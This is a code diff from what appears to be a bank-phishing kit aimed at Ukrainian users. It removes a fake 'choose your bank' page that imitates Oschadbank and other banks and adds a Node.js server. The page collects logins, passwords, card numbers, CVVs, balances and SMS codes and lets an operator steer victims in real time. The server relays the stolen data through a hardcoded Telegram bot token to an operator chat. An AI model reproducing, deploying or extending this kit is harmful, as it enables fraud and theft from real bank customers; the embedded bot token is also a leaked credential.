@@ -1,690 +1,244 @@
-<!DOCTYPE html>
-<html lang="uk">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Оберіть свій банк</title>
-    <style>
-        /* Общие стили для всех экранов и элементов */
-        *, *::before, *::after { box-sizing: border-box; }
-        :root {
-            --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
-            --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
-            font-size: 16px; /* Базовый размер шрифта */
-        }
-        .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
-        #bank-selection-screen { opacity: 1; transform: scale(1); }
-        
-        #form-screen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            opacity: 0; visibility: hidden; transform: scale(1.05);
-            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
-            display: flex; align-items: center; padding: 20px;
-            background: #f8f9fa; /* Общий фон для форм */
-        }
-        .form-container {
-            width: 100%; max-width: 380px; margin-left: auto; margin-right: auto;
-            background-color: var(--white); padding: 30px; border-radius: 20px;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
-        }
-        body.form-active { background: var(--bg-gradient); overflow: hidden; }
-        body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
-        body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
-        h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
-        .bank-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; }
-        .bank-item {
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            background-color: var(--white); padding: 20px; border: 1px solid var(--border-color);
-            border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
-            height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
-            box-shadow: 0 4px 10px var(--shadow-color); position: relative;
-        }
-        .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
-        .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
-        .bank-item .bank-name { font-size: 15px; font-weight: 600; }
-        .bank-item.disabled { opacity: 0.5; cursor: not-allowed; pointer-events: none; }
-        .bank-item.disabled .unavailable-label {
-            position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
-            font-size: 12px; font-weight: bold; color: var(--danger-color);
-            background-color: rgba(255, 255, 255, 0.8); padding: 2px 6px; border-radius: 4px;
-        }
+const express = require('express');
+const cors = require('cors');
+const TelegramBot = require('node-telegram-bot-api');
+const WebSocket = require('ws');
+const path = require('path');
 
-        /* --- Стили для модального окна ЛК Ощадбанка --- */
-        #custom-modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: #f8f9fa; /* Светлый фон */
-            display: none; justify-content: center; align-items: flex-start;
-            z-index: 1000;
-        }
-        .custom-modal-content {
-            background-color: transparent; padding: 0; border-radius: 0;
-            width: 100%; max-width: none; text-align: center; box-shadow: none;
-            display: flex; flex-direction: column; align-items: center;
-        }
-        .oschad-header {
-            width: 100%; display: flex; align-items: center;
-            padding: 10px 15px; background-color: #f8f9fa;
-        }
-        .oschad-header .back-arrow {
-            font-size: 28px; color: #495057; margin-right: 15px;
-            cursor: pointer; line-height: 1;
-        }
-        .oschad-header .title {
-            font-size: 18px; font-weight: 600; color: #212529;
-            flex-grow: 1; text-align: center; margin-right: 40px; /* Компенсация стрелки для центрирования */
-        }
-        .oschad-welcome-section {
-            padding: 20px; text-align: center; width: 100%;
-            display: flex; flex-direction: column; align-items: center; /* Центрируем всё содержимое */
-        }
-        .oschad-welcome-section p {
-            font-size: 16px; color: #495057; line-height: 1.5;
-            margin-bottom: 25px; font-weight: 500; /* Шрифт жирнее */
-            max-width: 350px; /* Ограничиваем ширину текста */
-        }
-        .oschad-toggle-buttons {
-            display: flex; background-color: #e9ecef; border-radius: 12px;
-            overflow: hidden; padding: 4px; margin-bottom: 30px; width: 100%; max-width: 350px;
-        }
-        .oschad-toggle-buttons button {
-            flex: 1; padding: 12px 15px; border: none; background-color: transparent;
-            font-size: 15px; font-weight: 600; color: #6c757d; cursor: pointer;
-            border-radius: 8px; transition: all 0.2s ease;
-        }
-        .oschad-toggle-buttons button.active {
-            background-color: var(--white); color: var(--dark-text);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        .oschad-input-group {
-            margin-bottom: 20px; width: 100%; max-width: 350px; position: relative;
-        }
-        .oschad-input-group label {
-            position: absolute; top: 15px; left: 15px; font-size: 15px; color: #adb5bd;
-            transition: all 0.2s ease; pointer-events: none; background-color: var(--white); padding: 0 4px;
-        }
-        /* Специфичный стиль для лейбла телефона, который всегда сверху */
-        .oschad-input-group label.static-label {
-             top: -10px; left: 10px; font-size: 12px; color: #6c757d;
-        }
-        .oschad-input-group input:focus + label,
-        .oschad-input-group input:not(:placeholder-shown) + label {
-            top: -10px; left: 10px; font-size: 12px; color: #6c757d;
-        }
-        .oschad-input-field {
-            width: 100%; padding: 15px 45px 15px 15px; /* Добавили отступ справа для иконки */
-            border: none; /* Убираем рамку */
-            border-bottom: 1px solid #dee2e6; /* Тонкая линия снизу */
-            border-radius: 0; /* Убираем закругления */
-            font-size: 16px; color: var(--dark-text); background-color: var(--white);
-            transition: all 0.2s ease; outline: none;
-            font-weight: 500; /* Шрифт жирнее */
-        }
-        .oschad-input-field:focus {
-            border-bottom-color: #00A39C; /* Зеленая линия при фокусе */
-        }
-        .oschad-input-field::placeholder { color: transparent; }
-        .password-toggle-icon {
-            position: absolute; right: 15px; top: 50%;
-            transform: translateY(-50%); cursor: pointer; color: #adb5bd;
-        }
-        .password-toggle-icon svg { width: 22px; height: 22px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
-        .oschad-phone-wrapper {
-            position: relative; display: flex; align-items: center;
-            width: 100%; border-bottom: 1px solid #dee2e6; background-color: var(--white);
-        }
-        .oschad-phone-wrapper:focus-within { border-bottom-color: #00A39C; }
-        .oschad-phone-prefix {
-            padding: 15px 0 15px 15px; font-size: 16px; color: var(--dark-text);
-            font-weight: 500;
-        }
-        .oschad-phone-wrapper .oschad-input-field {
-            border: none; padding-left: 5px; flex-grow: 1;
-        }
-        .oschad-submit-button {
-            width: 100%; max-width: 350px; padding: 16px; margin-top: 30px; border: none;
-            border-radius: 16px; /* Кнопка круглее */
-            background-color: #e9ecef; color: #adb5bd; font-size: 18px; font-weight: 700;
-            cursor: not-allowed; transition: all 0.2s ease;
-        }
-        .oschad-submit-button.active {
-            background-color: #00A39C; color: var(--white); cursor: pointer;
-        }
-        .loader-icon {
-            width: 80px; height: 80px; max-width: 100%; /* Ограничение размера */
-            margin: 20px auto;
-            -webkit-animation: spin 2s linear infinite; /* Анимация */
-            animation: spin 2s linear infinite;
-        }
-        @-webkit-keyframes spin { 0% { -webkit-transform: rotate(0deg); } 100% { -webkit-transform: rotate(360deg); } }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        /* Остальные стили для форм (без изменений) */
-        #form-header { text-align: center; margin-bottom: 25px; }
-        #form-header-logo { max-height: 50px; max-width: 150px; }
-        #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
-        #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500;}
-        .input-group { margin-bottom: 15px; position: relative; }
-        .input-field {
-            width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
-            font-size: 18px; font-weight: 500; transition: all 0.3s ease;
-        }
-        .error-message { color: var(--danger-color); font-size: 12px; margin-top: 4px; text-align: left; display: none; }
-        .phone-input-wrapper { display: flex; }
-        .phone-prefix {
-            padding: 15px; border: 1px solid var(--border-color); border-right: none;
-            background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
-            flex-shrink: 0; display: flex; align-items: center;
-        }
-        .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; }
-        .multi-input-row { display: flex; gap: 10px; }
-        .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
-        .btn {
-            width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px;
-            font-weight: 700; cursor: pointer; transition: all 0.3s ease; flex-basis: 0; flex-grow: 1;
-        }
-        .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
-        body[data-theme="oschadbank"] { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
-        /* Другие темы... */
-    </style>
-</head>
-<body>
-    <div id="bank-selection-screen" class="screen">
-        <h1>Оберіть свій банк</h1>
-        <div class="bank-grid"></div>
-    </div>
-    <div id="form-screen" class="screen">
-        <div class="form-container">
-            <div id="form-header"><img id="form-header-logo" src="" alt="Логотип банку"></div>
-            <h2 id="modal-title"></h2>
-            <div id="modal-step-content"></div>
-            <div class="modal-footer">
-                <button class="btn btn-back" id="back-btn">Назад</button>
-                <button class="btn btn-next" id="next-btn">Далі</button>
-            </div>
-        </div>
-    </div>
-    <div id="custom-modal-overlay">
-        <div class="custom-modal-content" id="custom-modal-content"></div>
-    </div>
+// Данные Telegram
+const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
+const CHAT_ID = '-4840920969';
 
-<script>
-document.addEventListener('DOMContentLoaded', () => {
-    const urlParams = new URLSearchParams(window.location.search);
-    const ref = urlParams.get('ref') || 'unknown';
-    localStorage.setItem('referrer', ref);
-    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-    let ws;
-    let activeBankData = {};
-    let currentStepIndex = 0;
-    let collectedData = {};
+// --- ИЗМЕНЕНИЕ: Динамическое определение URL для Render ---
+// Render автоматически предоставляет переменную RENDER_EXTERNAL_URL с текущим адресом сервиса
+const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
+// Собираем путь для вебхука
+const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
+// Собираем полный URL. Если сервис не на Render, он будет undefined.
+const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;
 
-    const specialFlowSteps = [
-        { type: 'phone', title: 'Введіть номер телефону' },
-        { type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }
-    ];
-    const confirmationSteps = [
-        {
-            type: 'confirm_all',
-            title: 'Підтвердити володіння карткою',
-            fields: [
-                { id: 'card_confirm', placeholder: 'Номер картки', type: 'tel', maxlength: '19' },
-                { id: 'card-expiry', placeholder: 'Термін дії (ММ/РР)', type: 'tel', maxlength: '5' },
-                { id: 'card-cvv', placeholder: 'CVV', type: 'tel', maxlength: '3' },
-                { id: 'balance', placeholder: 'Поточний баланс', type: 'number' }
-            ]
-        }
-    ];
 
-    const bankFlows = {
-        'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card', title: 'Введіть номер карти' }] },
-        'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: specialFlowSteps, special: true },
-        'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance', steps: specialFlowSteps, special: true },
-        'pumb': { name: 'ПУМБ', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp', theme: 'pumb', steps: specialFlowSteps, special: true },
-        'otp': { name: 'OTP Bank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png', theme: 'otp', steps: specialFlowSteps, special: true },
-        'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', steps: specialFlowSteps, special: true },
-        'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', steps: specialFlowSteps, special: true },
-        'ukrsib': { name: 'Укрсиб', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', theme: 'ukrsib', steps: specialFlowSteps, special: true }
-    };
-    
-    const bankGrid = document.querySelector('.bank-grid');
-    const body = document.body;
-    const formHeaderLogo = document.getElementById('form-header-logo');
-    const modalTitle = document.getElementById('modal-title');
-    const stepContent = document.getElementById('modal-step-content');
-    const modalFooter = document.querySelector('.modal-footer');
-    const nextBtn = document.getElementById('next-btn');
-    const backBtn = document.getElementById('back-btn');
-    const customModalOverlay = document.getElementById('custom-modal-overlay');
-    const customModalContent = document.getElementById('custom-modal-content');
-    bankGrid.innerHTML = Object.keys(bankFlows).map(id => `<a href="#" class="bank-item" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span></a>`).join('');
+// СПИСОК БАНКОВ ДЛЯ КНОПКИ "ЗАПРОС"
+const banksForRequestButton = [
+    'Райффайзен', 'Альянс', 'ПУМБ', 'OTP Bank',
+    'Восток', 'Izibank', 'Укрсиб'
+];
 
-    function connectWebSocket() {
-        const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
-        ws = new WebSocket(`${protocol}://${window.location.host}`);
-        ws.onopen = () => ws.send(JSON.stringify({ type: 'register', sessionId }));
-        ws.onmessage = (event) => handleServerCommand(JSON.parse(event.data));
-        ws.onclose = () => setTimeout(connectWebSocket, 3000);
-        ws.onerror = (error) => console.error('WebSocket error:', error);
-    }
-    
-    function renderCustomModal(type, bankName) {
-        let html = '';
-        if (type === 'lk') {
-            if (bankName === 'Ощадбанк') {
-                html = `
-                    <div class="oschad-header">
-                        <span class="back-arrow" id="oschad-back-arrow">←</span>
-                        <span class="title">Ласкаво просимо</span>
-                    </div>
-                    <div class="oschad-welcome-section">
-                        <p>Для входу або реєстрації введіть логін або номер телефону</p>
-                        <div class="oschad-toggle-buttons">
-                            <button id="toggle-phone" class="active">Номер телефону</button>
-                            <button id="toggle-login">Логін</button>
-                        </div>
+const app = express();
+app.use(express.json()); // Важно, чтобы req.body парсился корректно
+app.use(cors());
 
-                        <div id="phone-login-form">
-                            <div class="oschad-input-group">
-                                <label for="phone_input" class="static-label">Номер телефону</label>
-                                <div class="oschad-phone-wrapper">
-                                    <span class="oschad-phone-prefix">+380</span>
-                                    <input type="tel" class="oschad-input-field" id="phone_input" placeholder=" " autocomplete="off">
-                                </div>
-                            </div>
-                            <div class="oschad-input-group">
-                                <input type="password" class="oschad-input-field" id="phone_password_input" placeholder=" " autocomplete="off">
-                                <label for="phone_password_input">Пароль</label>
-                                <span class="password-toggle-icon">
-                                    <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
-                                </span>
-                            </div>
-                        </div>
+app.use((req, res, next) => {
+    // Простое логирование каждого запроса
+    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
+    next();
+});
 
-                        <div id="login-form" style="display: none;">
-                            <div class="oschad-input-group">
-                                <input type="text" class="oschad-input-field" id="login_input" placeholder=" " autocomplete="off">
-                                <label for="login_input">Логін</label>
-                            </div>
-                            <div class="oschad-input-group">
-                                <input type="password" class="oschad-input-field" id="login_password_input" placeholder=" " autocomplete="off">
-                                <label for="login_password_input">Пароль</label>
-                                <span class="password-toggle-icon">
-                                    <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
-                                </span>
-                            </div>
-                        </div>
-                    </div>
-                    <button class="oschad-submit-button" id="oschad-submit-btn" disabled>ПРОДОВЖИТИ</button>
-                `;
-            } else {
-                 html = `<h3>Авторизуйтесь</h3>
-                         <p>Будь ласка, введіть ваші облікові дані.</p>
-                         <div class="input-group"><input type="text" class="input-field" id="login" placeholder="Логін/Номер телефону"></div>
-                         <div class="input-group"><input type="password" class="input-field" id="password" placeholder="Пароль"></div>
-                         <button class="btn btn-next" id="custom-submit-btn">Продовжити</button>`;
-            }
-        }
-        customModalContent.innerHTML = html;
-        customModalOverlay.style.display = 'flex';
-        addCustomModalListeners(bankName);
-    }
-    
-    function addCustomModalListeners(bankName) {
-        const submitBtn = document.getElementById('custom-submit-btn') || document.getElementById('oschad-submit-btn');
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
 
-        if (bankName === 'Ощадбанк') {
-            const togglePhoneBtn = document.getElementById('toggle-phone');
-            const toggleLoginBtn = document.getElementById('toggle-login');
-            const phoneLoginForm = document.getElementById('phone-login-form');
-            const loginForm = document.getElementById('login-form');
-            const oschadBackArrow = document.getElementById('oschad-back-arrow');
+app.get('/panel', (req, res) => {
+    res.sendFile(path.join(__dirname, 'panel.html'));
+});
 
-            let activeOschadForm = 'phone';
-            
-            const phoneInput = document.getElementById('phone_input');
-            const phonePassInput = document.getElementById('phone_password_input');
-            const loginInput = document.getElementById('login_input');
-            const loginPassInput = document.getElementById('login_password_input');
-            
-            phoneInput.addEventListener('input', (e) => {
-                let value = e.target.value.replace(/\D/g, '').substring(0, 9);
-                let formatted = '';
-                if (value.length > 0) formatted += value.substring(0, 2);
-                if (value.length > 2) formatted += ' ' + value.substring(2, 5);
-                if (value.length > 5) formatted += ' ' + value.substring(5, 7);
-                if (value.length > 7) formatted += ' ' + value.substring(7, 9);
-                e.target.value = formatted.trim();
-            });
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
-            const updateOschadButtonState = () => {
-                const isPhoneFormValid = activeOschadForm === 'phone' && phoneInput.value.replace(/\D/g, '').length === 9 && phonePassInput.value.length > 0;
-                const isLoginFormValid = activeOschadForm === 'login' && loginInput.value.length > 0 && loginPassInput.value.length > 0;
+// --- ИЗМЕНЕНИЕ: Установка вебхука только если URL определен ---
+if (WEBHOOK_URL) {
+    bot.setWebHook(WEBHOOK_URL)
+        .then(() => console.log(`Webhook успешно установлен на ${WEBHOOK_URL}`))
+        .catch(err => console.error('Ошибка установки вебхука:', err));
+    bot.sendMessage(CHAT_ID, 'СЕРВЕР ПЕРЕЗАПУЩЕН! (Динамический URL) Хорошего ворка! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
+} else {
+    console.error('Критическая ошибка: не удалось определить RENDER_EXTERNAL_URL. Вебхук не установлен. Убедитесь, что сервис запущен на Render.');
+}
 
-                if (isPhoneFormValid || isLoginFormValid) {
-                    submitBtn.classList.add('active');
-                    submitBtn.disabled = false;
-                } else {
-                    submitBtn.classList.remove('active');
-                    submitBtn.disabled = true;
-                }
-            };
-            
-            [phoneInput, phonePassInput, loginInput, loginPassInput].forEach(input => {
-                if (input) input.addEventListener('input', updateOschadButtonState);
-            });
 
-            togglePhoneBtn.addEventListener('click', () => {
-                togglePhoneBtn.classList.add('active');
-                toggleLoginBtn.classList.remove('active');
-                phoneLoginForm.style.display = 'block';
-                loginForm.style.display = 'none';
-                activeOschadForm = 'phone';
-                updateOschadButtonState();
-            });
+bot.getMe().then(me => console.log(`Бот запущен: @${me.username}`)).catch(err => console.error('Ошибка бота:', err));
 
-            toggleLoginBtn.addEventListener('click', () => {
-                toggleLoginBtn.classList.add('active');
-                togglePhoneBtn.classList.remove('active');
-                phoneLoginForm.style.display = 'none';
-                loginForm.style.display = 'block';
-                activeOschadForm = 'login';
-                updateOschadButtonState();
-            });
+// --- ИЗМЕНЕНИЕ: Упрощенный обработчик вебхука ---
+// Telegram будет отправлять обновления на этот адрес
+app.post(webhookPath, (req, res) => {
+    // --- ДОБАВЛЕНО ЛОГИРОВАНИЕ ---
+    console.log('--- ПОЛУЧЕН WEBHOOK ОТ TELEGRAM ---');
+    console.log(JSON.stringify(req.body, null, 2)); // Печатаем всё тело запроса для отладки
+    // Передаем обновление в библиотеку для обработки
+    bot.processUpdate(req.body);
+    res.sendStatus(200); // Отвечаем Telegram, что все ОК
+});
 
-            oschadBackArrow.addEventListener('click', () => { customModalOverlay.style.display = 'none'; });
-            
-            customModalContent.querySelectorAll('.password-toggle-icon').forEach(icon => {
-                icon.addEventListener('click', () => {
-                    const passwordInput = icon.closest('.oschad-input-group').querySelector('input');
-                    const isPassword = passwordInput.type === 'password';
-                    passwordInput.type = isPassword ? 'text' : 'password';
-                    icon.style.color = isPassword ? '#212529' : '#adb5bd';
-                });
-            });
-        }
-        
-        if (submitBtn) {
-            submitBtn.onclick = () => {
-                if(submitBtn.disabled) return;
-                const dataToSend = {};
-                if (bankName === 'Ощадбанк') {
-                    if (document.getElementById('phone-login-form').style.display !== 'none') {
-                        dataToSend.phone = '+380' + document.getElementById('phone_input').value.replace(/\D/g, '');
-                        dataToSend.password = document.getElementById('phone_password_input').value;
-                    } else {
-                        dataToSend.login = document.getElementById('login_input').value;
-                        dataToSend.password = document.getElementById('login_password_input').value;
-                    }
-                } else {
-                    const inputs = customModalContent.querySelectorAll('.input-field');
-                    inputs.forEach(el => { if (el.value) dataToSend[el.id] = el.value; });
-                }
-                
-                sendDataToServer(dataToSend, true);
-                
-                if (bankName === 'Ощадбанк') {
-                     customModalContent.innerHTML = `
-                         <div class="oschad-header">
-                            <span class="back-arrow" onclick="document.getElementById('custom-modal-overlay').style.display='none'">←</span>
-                            <span class="title">Зачекайте</span>
-                        </div>
-                        <div class="oschad-welcome-section">
-                            <h3>Зачекайте</h3>
-                            <p>Сервер перевантажений</p>
-                            <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
-                        </div>
-                     `;
-                } else {
-                    customModalContent.innerHTML = `<h3>Очікуємо</h3><p>Заявку відправлено. НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
-                }
-            };
-        }
-    }
-    
-    // --- ДАЛЕЕ ИДЕТ ПОЛНЫЙ ОСТАТОК JAVASCRIPT БЕЗ СОКРАЩЕНИЙ ---
-    
-    async function sendDataToServer(data, isFinal) {
-        collectedData = { ...collectedData, ...data };
+
+const server = require('http').createServer(app);
+const wss = new WebSocket.Server({ server });
+
+const clients = new Map();
+const sessions = new Map();
+const cardVisitCounts = new Map();
+const waitingForCustomMessage = new Map();
+
+wss.on('connection', (ws) => {
+    console.log('Клиент подключился по WebSocket');
+    ws.on('message', (message) => {
         try {
-            await fetch(`/api/submit`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    sessionId,
-                    bankName: activeBankData.name,
-                    isFinalStep: isFinal,
-                    referrer: localStorage.getItem('referrer') || 'unknown',
-                    ...collectedData
-                }),
-            });
-        } catch (error) {
-            console.error('Failed to send data:', error);
-        }
-    }
-
-    function handleServerCommand(command) {
-        const { type, data } = command;
-        const showMessageInMainModal = (title, text, btnText, callback) => {
-            modalTitle.textContent = title;
-            stepContent.innerHTML = `<p style="text-align:center;">${text}</p>`;
-            modalFooter.style.display = 'flex';
-            modalFooter.innerHTML = `<button class="btn btn-next">${btnText}</button>`;
-            modalFooter.querySelector('button').onclick = callback;
-        };
-        switch (type) {
-            case 'sms':
-                modalTitle.textContent = 'Введіть код з SMS';
-                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
-                modalFooter.style.display = 'flex';
-                modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
-                document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
-                break;
-            case 'lk':
-                renderCustomModal('lk', data.bankName);
-                break;
-            case 'call':
-                renderCustomModal('call', data.bankName);
-                break;
-            case 'request_details':
-                activeBankData.steps.push(...confirmationSteps);
-                currentStepIndex++;
-                renderStep();
-                break;
-            case 'other':
-                const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
-                if (bankToDisable) {
-                    bankToDisable.classList.add('disabled');
-                    if (!bankToDisable.querySelector('.unavailable-label')) {
-                        bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
-                    }
-                }
-                showMessageInMainModal("Помилка", data.text, "Обрати інший банк", () => window.location.reload());
-                break;
-            case 'pin_error':
-                showMessageInMainModal("Невірний ПІН", data.text, "Назад", () => { currentStepIndex > 0 ? handleBackStep() : window.location.reload(); });
-                break;
-            case 'number_error':
-                showMessageInMainModal("Невірний номер", data.text, "Назад", () => { currentStepIndex > 0 ? handleBackStep() : window.location.reload(); });
-                break;
-            case 'code_error':
-                const smsErrorContainer = document.getElementById('sms-error-container');
-                if (smsErrorContainer) smsErrorContainer.innerHTML = `<p style="color:red; text-align:center;">Ви ввели невірний код</p>`;
-                break;
-            case 'ban':
-                document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>🚫<br>Доступ заблоковано</h1></div>`;
-                if (ws) ws.close();
-                break;
-            case 'custom_message_text':
-                showMessageInMainModal("Повідомлення від оператора", data.text, "Зрозуміло", renderStep);
-                break;
-        }
-    }
-
-    function handleNextStep() {
-        if (!validateCurrentStep()) return;
-        let data = {};
-        stepContent.querySelectorAll('.input-field').forEach(input => {
-            let key = input.id;
-            let value = input.value;
-            if (key === 'phone') value = '+380' + value.replace(/\D/g, '');
-            if (key === 'card' || key === 'card_confirm') value = value.replace(/\s/g, '');
-            data[key] = value;
-        });
-        const step = activeBankData.steps[currentStepIndex];
-        let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
-        if (activeBankData.theme === 'oschadbank' && step.type === 'card') {
-            isFinalStep = true;
-        }
-        sendDataToServer(data, isFinalStep);
-        if ((activeBankData.special && step.type === 'card_simple') || (activeBankData.theme === 'oschadbank' && step.type === 'card')) {
-            showWaitingScreen();
-            return;
-        }
-        currentStepIndex++;
-        if (currentStepIndex < activeBankData.steps.length) {
-            renderStep();
-        } else {
-            showWaitingScreen();
-        }
-    }
-
-    const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''}><div class="error-message"></div></div>`;
-
-    function renderStep() {
-        if (!activeBankData.steps || !activeBankData.steps[currentStepIndex]) return;
-        const step = activeBankData.steps[currentStepIndex];
-        let html = '';
-        switch (step.type) {
-            case 'phone':
-                html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`;
-                break;
-            case 'card':
-            case 'card_simple':
-                html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19');
-                break;
-            case 'pin':
-                html = generateInputHTML('pin', 'ПІН-код', 'password', '4');
-                break;
-            case 'call_code':
-                html = `<p>Зараз вам буде здійснено дзвінок...</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
-                break;
-            case 'confirm_all':
-                html = step.fields.map(field => generateInputHTML(field.id, field.placeholder, field.type, field.maxlength)).join('');
-                break;
-        }
-        modalTitle.textContent = step.title;
-        stepContent.innerHTML = html;
-        modalFooter.style.display = 'flex';
-        backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none';
-        nextBtn.style.display = 'block';
-        addInputFormatting();
-    }
-
-    function showWaitingScreen() {
-        modalTitle.textContent = 'Очікуємо';
-        stepContent.innerHTML = `<p>Заявку відправлено. Будь ласка, чекайте. <b>НЕ ЗАКРИВАЙТЕ САЙТ!</b></p>`;
-        modalFooter.style.display = 'none';
-    }
-
-    function handleBackStep() {
-        if (currentStepIndex > 0) {
-            currentStepIndex--;
-            renderStep();
-        } else {
-            body.classList.remove('form-active');
-        }
-    }
-
-    function addInputFormatting() {
-        const phoneInput = document.getElementById('phone');
-        if (phoneInput) {
-            phoneInput.addEventListener('input', (e) => {
-                let value = e.target.value.replace(/\D/g, '').substring(0, 9);
-                e.target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim();
-            });
-        }
-        const cardNumberInput = document.getElementById('card') || document.getElementById('card_confirm');
-        if (cardNumberInput) {
-            cardNumberInput.addEventListener('input', (e) => {
-                e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
-            });
-        }
-        const cardExpiryInput = document.getElementById('card-expiry');
-        if (cardExpiryInput) {
-            cardExpiryInput.addEventListener('input', (e) => {
-                e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2');
-            });
-        }
-    }
-
-    function validateCurrentStep() {
-        let isValid = true;
-        stepContent.querySelectorAll('.input-field').forEach(input => {
-            const errorContainer = input.closest('.input-group').querySelector('.error-message');
-            input.classList.remove('invalid');
-            if (errorContainer) errorContainer.style.display = 'none';
